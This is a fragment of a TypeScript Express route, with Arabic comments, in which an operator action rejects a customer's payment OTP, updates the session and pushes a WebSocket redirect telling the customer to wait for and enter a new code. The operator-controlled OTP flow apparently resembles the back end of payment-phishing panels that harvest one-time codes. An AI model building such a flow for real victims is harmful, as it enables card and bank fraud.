      // تحديث الجلسة
      await db
        .update(sessionsTable)
        .set({ applicationId: newApp.id, lastSeenAt: new Date() })
        .where(eq(sessionsTable.id, newApp.sessionId));

      // إرسال إشعار WebSocket للعميل
      broadcast({
        type: "otp_rejected",
        sessionId: newApp.sessionId,
        data: {
          paymentStatus: "approved",
          currentStep: "pay-otp",
          redirectUrl: `/pay-otp?applicationId=${newApp.id}&session=${newApp.sessionId}`,
          message: "تم إدخال رمز غير صحيح أو منتهي. يرجى انتظار رمز جديد.",
        },
      });

      res.json({
        success: true,
        message: "تم رفض الرمز وإرسال رمز جديد للعميل",
      });
    }
  } catch (err) {
    req.log.error({ err }, "خطأ في معالجة إجراء OTP");
    res.status(500).json({ error: "فشل في معالجة الإجراء" });
  }
});

export default router;
